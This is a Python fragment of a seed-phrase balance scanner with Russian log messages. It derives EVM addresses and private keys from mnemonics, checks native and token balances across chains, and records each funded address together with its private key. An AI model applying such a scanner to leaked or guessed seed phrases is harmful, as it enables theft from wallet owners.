def connect_rpc(rpc_list):
    for url in rpc_list:
        try:
            w3 = Web3(Web3.HTTPProvider(url, request_kwargs={"timeout": 15}))
            if w3.is_connected():
                return w3
        except Exception:
            continue
    return None

def get_native_balance(w3, address, decimals):
    try:
        bal = w3.eth.get_balance(address)
        return bal / (10 ** decimals)
    except Exception:
        return None

def get_token_balance(w3, token_cfg, address):
    try:
        contract = w3.eth.contract(
            address=Web3.to_checksum_address(token_cfg["address"]),
            abi=ERC20_ABI,
        )
        bal = contract.functions.balanceOf(
            Web3.to_checksum_address(address)
        ).call()
        return bal / (10 ** token_cfg["decimals"])
    except Exception:
        return None

def get_nonce(w3, address):
    try:
        return w3.eth.get_transaction_count(address)
    except Exception:
        return None

def evm_scan_address(seed, index, address, private_key, w3_map):
    hits = []
    for chain, w3 in w3_map.items():
        name, dec, symbol = CHAIN_INFO[chain]
        if w3 is None:
            continue

        nonce = get_nonce(w3, address)
        native = get_native_balance(w3, address, dec)

        nonzero = False
        balances = {}

        if nonce is not None and nonce > 0:
            nonzero = True
        balances[f"native_{symbol}"] = native if native is not None else "ERR"
        if native is not None and native > 0:
            nonzero = True

        if chain in TOKENS:
            for t_sym, t_cfg in TOKENS[chain].items():
                t_bal = get_token_balance(w3, t_cfg, address)
                balances[t_sym] = t_bal if t_bal is not None else "ERR"
                if isinstance(t_bal, (int, float)) and t_bal > 0:
                    nonzero = True

        if nonzero:
            hits.append({
                "seed": seed,
                "index": index,
                "chain": name,
                "address": address,
                "private_key": private_key,
                "nonce": nonce,
                "balances": balances,
            })

    return hits

def scan_evm_for_seed(mnemonic):
    try:
        seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    except Exception:
        print(f"Невалидная сид-фраза (EVM): {mnemonic}")
        return []

    bip44_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)

    w3_map = {}
    for chain, rpc_list in RPC.items():
        w3 = connect_rpc(rpc_list)
        if w3:
            w3_map[chain] = w3
        else:
            w3_map[chain] = None
            print(f"❌ Нет RPC для {chain}")

    hits = []
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = []
        for i in range(MAX_ADDR_PER_SEED):
            account = (
                bip44_ctx.Purpose()
                .Coin()
                .Account(0)
                .Change(Bip44Changes.CHAIN_EXT)
                .AddressIndex(i)
            )
            private_key = account.PrivateKey().Raw().ToHex()
            address = account.PublicKey().ToAddress()

            print(f"[EVM] {mnemonic[:10]}... | addr #{i}: {address}")
            fut = executor.submit(
                evm_scan_address,
                mnemonic,
                i,
                address,
                private_key,
                w3_map,
            )
            futures.append(fut)
            time.sleep(0.01 + random.random() * 0.02)

        for fut in as_completed(futures):
            res = fut.result()
            if res:
                hits.extend(res)

    return hits

